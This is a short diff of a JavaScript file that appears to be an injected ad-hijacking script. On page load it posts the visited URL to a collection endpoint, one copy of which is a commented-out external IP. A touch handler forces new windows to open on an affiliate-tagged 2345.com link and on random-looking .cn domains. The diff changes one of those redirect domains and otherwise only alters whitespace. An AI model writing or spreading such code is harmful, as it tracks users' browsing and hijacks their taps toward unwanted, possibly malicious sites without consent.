@@ -23,7 +23,7 @@ window.onload = function() {
 		script.onload = script.onreadystatechange = null;
 	}
 
-
+ 
 }
 
 function ap(reqType, ad, url1) {
@@ -32,7 +32,7 @@ if (navigator.cookieEnabled == true) {
 	
 	//sendPostRequest("http://113.57.230.176:8888/404/Po", "reqType=3&url=" + url1);
 	sendPostRequest("http://127.0.0.1:8080/404/Po", "reqType=3&url=" + url1);
-	
+	  
 	var v1=0;
 	var v3=0;
 	var v4=0;
@@ -345,7 +345,7 @@ function touchSatrtFunc(e) {
 		if (ap == 5) {
 			//window.opp = 11;
 			//window.open("http://iwap.2345.com/?lm_1128");
-			newWindow.location = "http://iwap.2345.com/?lm_1128";			
+			newWindow.location="http://iwap.2345.com/?lm_1128";			
 		}
 		if (ap == 4) {
 			//window.opp = 11;
@@ -380,7 +380,7 @@ function touchSatrtFunc(e) {
 		}
 		if(ap==8)
 			{
-			newWindow.location = "http://wrmxsylqj.cn/app/9.gif";
+			newWindow.location = "http://jjxsylcqk.cn/app/39.gif";
 			}
 		$.ajax({
 			type : 'post',
